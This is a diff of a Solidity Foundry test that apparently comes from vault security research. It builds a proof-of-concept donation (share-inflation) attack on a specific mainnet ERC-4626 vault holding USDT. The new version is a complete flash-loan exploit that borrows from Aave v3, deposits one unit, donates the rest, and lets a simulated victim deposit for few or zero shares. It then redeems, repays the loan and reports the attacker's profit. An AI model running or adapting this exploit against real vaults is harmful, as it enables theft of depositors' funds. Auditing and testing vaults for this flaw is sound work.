@@ -1,30 +1,11 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.15;
 
-// ===========================================================================
-// Vault 0x356b Donation Attack PoC
-//
-// @KeyInfo
-// Vault Address: 0x356B8d89c1e1239Cbbb9dE4815c39A1474d5BA7D
-// Asset: USDT (0xdAC17F958D2ee523a2206206994597C13D831ec7)
-// Deploy Block: 20,434,756
-// Lending Platform: Aave v3
-//
-// @AnalysisResult
-// 该 vault 是 BALANCE-BASED 的！totalAssets() 返回 balanceOf(vault) + assetsUnderManagement()
-// 当 assetsUnderManagement() = 0 时，totalAssets = balanceOf(vault)
-// 这意味着经典 donation attack 是可行的！
-//
-// @Conclusion
-// 该 vault 对 donation attack VULNERABLE
-// ===========================================================================
+// Vault 0x356b (Aave v3, USDT) - Donation Attack PoC (Flash Loan)
+// USDT is non-standard ERC20 (no bool return), requires low-level calls
 
 import "../basetest.sol";
 import {IERC20} from "../interface.sol";
-
-// ---------------------------------------------------------------------------
-// 接口定义
-// ---------------------------------------------------------------------------
 
 interface IERC4626Vault is IERC20 {
     function asset() external view returns (address);
@@ -37,211 +18,116 @@ interface IERC4626Vault is IERC20 {
     function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);
 }
 
-// ---------------------------------------------------------------------------
-// 主测试合约
-// ---------------------------------------------------------------------------
+interface IAaveV3Pool {
+    function flashLoanSimple(
+        address receiverAddress, address asset, uint256 amount,
+        bytes calldata params, uint16 referralCode
+    ) external;
+}
 
 contract Vault_0x356b_DonationPoC is BaseTestWithBalanceLog {
-    // === 地址常量 ===
     IERC4626Vault internal constant VAULT = IERC4626Vault(0x356B8d89c1e1239Cbbb9dE4815c39A1474d5BA7D);
-    IERC20 internal constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
-    
-    // === Fork 区块 - 部署区块 ===
-    uint256 internal constant DEPLOY_BLOCK = 20_434_756;
-
-    // === 攻击参数 ===
-    uint256 internal constant DONATION_AMOUNT = 1000 * 1e6; // 1000 USDT
-    uint256 internal constant VICTIM_DEPOSIT = 10 * 1e6; // 10 USDT
-    uint256 internal constant ATTACKER_DEPOSIT = 1e6; // 1 USDT
-
-    // === 测试账户 ===
-    address internal constant ATTACKER = address(0xdead);
+    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+    IAaveV3Pool internal constant AAVE_POOL = IAaveV3Pool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
+    uint256 internal constant FORK_BLOCK = 20_434_756;
     address internal constant VICTIM = address(0xbeef);
 
-    // === 运行时变量 ===
-    uint256 internal actualForkBlock;
+    uint256 internal constant DONATION_AMOUNT = 10_000 * 1e6; // 10K USDT
+    uint256 internal constant VICTIM_DEPOSIT = 100 * 1e6;     // 100 USDT
 
     function setUp() public {
-        actualForkBlock = DEPLOY_BLOCK;
-        vm.createSelectFork("mainnet", actualForkBlock);
-        fundingToken = address(USDT);
-
+        vm.createSelectFork("mainnet", FORK_BLOCK);
+        fundingToken = USDT;
         vm.label(address(VAULT), "Vault");
-        vm.label(address(USDT), "USDT");
-        vm.label(ATTACKER, "Attacker");
+        vm.label(USDT, "USDT");
+        vm.label(address(AAVE_POOL), "AaveV3Pool");
         vm.label(VICTIM, "Victim");
-
-        // 打印初始状态
-        emit log_string("=== Setup: Checking Vault State at Deploy Block ===");
-        emit log_named_uint("Fork Block", actualForkBlock);
-        emit log_named_address("Vault", address(VAULT));
-        emit log_named_address("Asset", address(USDT));
-        emit log_named_decimal_uint("Vault.totalSupply()", VAULT.totalSupply(), 6);
-        emit log_named_decimal_uint("Vault.totalAssets()", VAULT.totalAssets(), 6);
-        emit log_named_decimal_uint("USDT.balanceOf(vault)", USDT.balanceOf(address(VAULT)), 6);
+        emit log_string("=== Setup ===");
+        emit log_named_uint("Fork Block", FORK_BLOCK);
+        emit log_named_decimal_uint("totalSupply", VAULT.totalSupply(), 6);
+        emit log_named_decimal_uint("totalAssets", VAULT.totalAssets(), 6);
     }
 
-    // =========================================================================
-    // 辅助函数: 使用 vm.store 设置 USDT 余额
-    // =========================================================================
-    function _setUsdtBalance(address account, uint256 amount) internal {
-        bytes32 slot = keccak256(abi.encode(account, uint256(2)));
-        vm.store(address(USDT), slot, bytes32(amount));
+    // USDT safe wrappers (no bool return)
+    function _safeApprove(address spender, uint256 amt) internal {
+        (bool s1,) = USDT.call(abi.encodeWithSignature("approve(address,uint256)", spender, uint256(0)));
+        require(s1, "approve(0) failed");
+        if (amt > 0) {
+            (bool s2,) = USDT.call(abi.encodeWithSignature("approve(address,uint256)", spender, amt));
+            require(s2, "approve failed");
+        }
+    }
+    function _safeTransfer(address to, uint256 amt) internal {
+        (bool s,) = USDT.call(abi.encodeWithSignature("transfer(address,uint256)", to, amt));
+        require(s, "transfer failed");
     }
 
-    // =========================================================================
-    // Test 1: 验证 vault 是 balance-based (donation 敏感)
-    // =========================================================================
     function testDonationSensitivity() public {
-        emit log_string("=== Test 1: Donation Sensitivity Check ===");
-        emit log_named_uint("Fork Block", actualForkBlock);
-
-        uint256 totalSupplyBefore = VAULT.totalSupply();
-        uint256 totalAssetsBefore = VAULT.totalAssets();
-        uint256 vaultBalanceBefore = USDT.balanceOf(address(VAULT));
-
-        emit log_named_decimal_uint("Total Supply Before", totalSupplyBefore, 6);
-        emit log_named_decimal_uint("Total Assets Before", totalAssetsBefore, 6);
-        emit log_named_decimal_uint("Vault Balance Before", vaultBalanceBefore, 6);
-
-        // 验证 vault 是空的
-        require(totalSupplyBefore == 0, "Vault should be empty at deploy block");
-        emit log_string("[OK] Vault is EMPTY at deploy block");
-
-        // 使用 vm.store 给 vault 增加 USDT 余额 (模拟 donation)
-        _setUsdtBalance(address(VAULT), DONATION_AMOUNT);
-
-        uint256 totalAssetsAfter = VAULT.totalAssets();
-        uint256 vaultBalanceAfter = USDT.balanceOf(address(VAULT));
-
-        emit log_named_decimal_uint("Total Assets After Donation", totalAssetsAfter, 6);
-        emit log_named_decimal_uint("Vault Balance After Donation", vaultBalanceAfter, 6);
-
-        // 验证 balance-based: totalAssets 应该随着 balance 变化
-        require(totalAssetsAfter == vaultBalanceAfter, "totalAssets should equal balance");
-        require(totalAssetsAfter > totalAssetsBefore, "Donation should increase totalAssets");
-        
-        emit log_string("[OK] Vault is BALANCE-BASED (donation sensitive)");
-        emit log_string("[WARNING] Vault may be VULNERABLE to donation attack");
+        uint256 before_ = VAULT.totalAssets();
+        deal(USDT, address(this), DONATION_AMOUNT);
+        _safeTransfer(address(VAULT), DONATION_AMOUNT);
+        uint256 after_ = VAULT.totalAssets();
+        emit log_named_decimal_uint("totalAssets before", before_, 6);
+        emit log_named_decimal_uint("totalAssets after", after_, 6);
+        if (after_ > before_) emit log_string("[OK] BALANCE-BASED");
+        else emit log_string("[INFO] INTERNAL ACCOUNTING");
     }
 
-    // =========================================================================
-    // Test 2: 验证 donation 导致 share price 膨胀
-    // =========================================================================
-    function testDonationAttack() public balanceLog {
-        emit log_string("=== Test 2: Donation Attack - Share Price Inflation ===");
-        emit log_named_uint("Fork Block", actualForkBlock);
-
-        uint256 totalSupplyBefore = VAULT.totalSupply();
-        uint256 totalAssetsBefore = VAULT.totalAssets();
-
-        emit log_named_decimal_uint("Initial Total Supply", totalSupplyBefore, 6);
-        emit log_named_decimal_uint("Initial Total Assets", totalAssetsBefore, 6);
-
-        // 执行 donation
-        emit log_string("=== Simulating donation via vm.store ===");
-        _setUsdtBalance(address(VAULT), DONATION_AMOUNT);
-
-        uint256 totalAssetsAfterDonation = VAULT.totalAssets();
-        uint256 vaultBalanceAfter = USDT.balanceOf(address(VAULT));
-
-        emit log_named_decimal_uint("Total Assets After Donation", totalAssetsAfterDonation, 6);
-        emit log_named_decimal_uint("Vault Balance After Donation", vaultBalanceAfter, 6);
-
-        // 验证 donation 有效
-        require(totalAssetsAfterDonation == DONATION_AMOUNT, "Donation should increase totalAssets");
-        require(totalAssetsAfterDonation == vaultBalanceAfter, "totalAssets should equal balance");
-        
-        emit log_string("[PASS] Donation successfully inflated totalAssets");
-        emit log_string("[INFO] If vault had shares, share price would be inflated");
-    }
-
-    // =========================================================================
-    // Test 3: 完整攻击分析 - 验证 vault 对 donation attack 的敏感性
-    // =========================================================================
     function testFullAttackFlow() public balanceLog {
-        emit log_string("============================================================");
-        emit log_string("=== Test 3: Full Donation Attack Analysis ===");
-        emit log_string("============================================================");
-        emit log_named_uint("Fork Block", actualForkBlock);
+        emit log_string("=== ERC4626 Donation Attack via Flash Loan (USDT) ===");
+        require(VAULT.totalSupply() == 0, "Vault must be empty");
+        uint256 flashAmt = DONATION_AMOUNT + 1;
+        emit log_named_decimal_uint("Flash Loan Amount", flashAmt, 6);
+        AAVE_POOL.flashLoanSimple(address(this), USDT, flashAmt, "", 0);
+        uint256 profit = IERC20(USDT).balanceOf(address(this));
+        emit log_string("=== RESULT ===");
+        emit log_named_decimal_uint("Net Profit", profit, 6);
+        if (profit > 0) emit log_string("[PASS] ATTACK PROFITABLE!");
+        else emit log_string("[INFO] Not profitable or protected");
+    }
 
-        // 记录初始状态
-        uint256 initialTotalSupply = VAULT.totalSupply();
-        uint256 initialTotalAssets = VAULT.totalAssets();
-        uint256 initialVaultBalance = USDT.balanceOf(address(VAULT));
+    function executeOperation(
+        address, uint256 amount, uint256 premium, address, bytes calldata
+    ) external returns (bool) {
+        require(msg.sender == address(AAVE_POOL), "not Aave");
+        uint256 repay = amount + premium;
+        emit log_named_decimal_uint("Borrowed", amount, 6);
+        emit log_named_decimal_uint("Fee", premium, 6);
 
-        emit log_named_decimal_uint("Initial Total Supply", initialTotalSupply, 6);
-        emit log_named_decimal_uint("Initial Total Assets", initialTotalAssets, 6);
-        emit log_named_decimal_uint("Initial Vault Balance", initialVaultBalance, 6);
+        // Step 1: deposit 1 wei USDT
+        _safeApprove(address(VAULT), 1);
+        uint256 atkShares = VAULT.deposit(1, address(this));
+        emit log_named_decimal_uint("Attacker shares", atkShares, 6);
 
-        require(initialTotalSupply == 0, "Vault must be empty for analysis");
+        // Step 2: donate rest
+        _safeTransfer(address(VAULT), amount - 1);
+        emit log_named_decimal_uint("Share price/unit", VAULT.convertToAssets(1e6), 6);
 
-        // =============================================================
-        // Step 1: 模拟 donation
-        // =============================================================
-        emit log_string("");
-        emit log_string("=== Step 1: Simulating donation ===");
-        
-        _setUsdtBalance(address(VAULT), DONATION_AMOUNT);
-
-        uint256 totalAssetsAfterDonation = VAULT.totalAssets();
-        uint256 vaultBalanceAfterDonation = USDT.balanceOf(address(VAULT));
-
-        emit log_named_decimal_uint("Donation Amount", DONATION_AMOUNT, 6);
-        emit log_named_decimal_uint("Total Assets After Donation", totalAssetsAfterDonation, 6);
-        emit log_named_decimal_uint("Vault Balance After Donation", vaultBalanceAfterDonation, 6);
-
-        // =============================================================
-        // Step 2: 分析结果
-        // =============================================================
-        emit log_string("");
-        emit log_string("=== Step 2: Analyzing results ===");
-
-        bool totalAssetsChanged = (totalAssetsAfterDonation != initialTotalAssets);
-        bool totalAssetsEqualsBalance = (totalAssetsAfterDonation == vaultBalanceAfterDonation);
-
-        emit log_named_uint("Total Assets Changed", totalAssetsChanged ? 1 : 0);
-        emit log_named_uint("Total Assets == Balance", totalAssetsEqualsBalance ? 1 : 0);
-
-        // =============================================================
-        // 最终分析
-        // =============================================================
-        emit log_string("");
-        emit log_string("============================================================");
-        emit log_string("=== FINAL ANALYSIS ===");
-        emit log_string("============================================================");
-
-        if (totalAssetsChanged && totalAssetsEqualsBalance) {
-            emit log_string("");
-            emit log_string("[FINDING 1] Donation increased vault balance");
-            emit log_string("[FINDING 2] totalAssets() == balanceOf(vault)");
-            emit log_string("");
-            emit log_string("[CONCLUSION] Vault is BALANCE-BASED");
-            emit log_string("             Classic donation attack is POSSIBLE");
-            emit log_string("");
-            emit log_string("[SECURITY STATUS] VULNERABLE to donation attack");
-        } else {
-            emit log_string("");
-            emit log_string("[INFO] Vault may use internal accounting");
-            emit log_string("       Further investigation needed");
+        // Step 3: victim deposits
+        deal(USDT, VICTIM, VICTIM_DEPOSIT);
+        vm.startPrank(VICTIM);
+        (bool sa,) = USDT.call(abi.encodeWithSignature("approve(address,uint256)", address(VAULT), VICTIM_DEPOSIT));
+        require(sa);
+        try VAULT.deposit(VICTIM_DEPOSIT, VICTIM) returns (uint256 vs) {
+            vm.stopPrank();
+            emit log_named_decimal_uint("Victim shares", vs, 6);
+            if (vs == 0) emit log_string("[CRITICAL] Victim got 0 shares!");
+            else {
+                uint256 vv = VAULT.convertToAssets(vs);
+                emit log_named_decimal_uint("Victim value", vv, 6);
+                emit log_named_decimal_uint("Victim loss", VICTIM_DEPOSIT > vv ? VICTIM_DEPOSIT - vv : 0, 6);
+            }
+        } catch {
+            vm.stopPrank();
+            emit log_string("[INFO] Victim deposit reverted (0-share protection)");
         }
 
-        // =============================================================
-        // 断言
-        // =============================================================
-        emit log_string("");
-        emit log_string("=== ASSERTIONS ===");
+        // Step 4: attacker redeems
+        uint256 redeemed = VAULT.redeem(atkShares, address(this), address(this));
+        emit log_named_decimal_uint("Attacker redeemed", redeemed, 6);
 
-        require(totalAssetsChanged, "totalAssets should change after donation");
-        require(totalAssetsEqualsBalance, "totalAssets should equal balance");
-        emit log_string("[PASS] Vault is BALANCE-BASED and VULNERABLE");
-
-        emit log_string("");
-        emit log_string("============================================================");
-        emit log_string("[OK] Analysis completed!");
-        emit log_string("CONCLUSION: This vault is BALANCE-BASED");
-        emit log_string("            Donation attack is theoretically possible");
-        emit log_string("            if deposit/redeem functions are callable");
-        emit log_string("============================================================");
+        // Step 5: repay
+        _safeApprove(address(AAVE_POOL), repay);
+        return true;
     }
 }
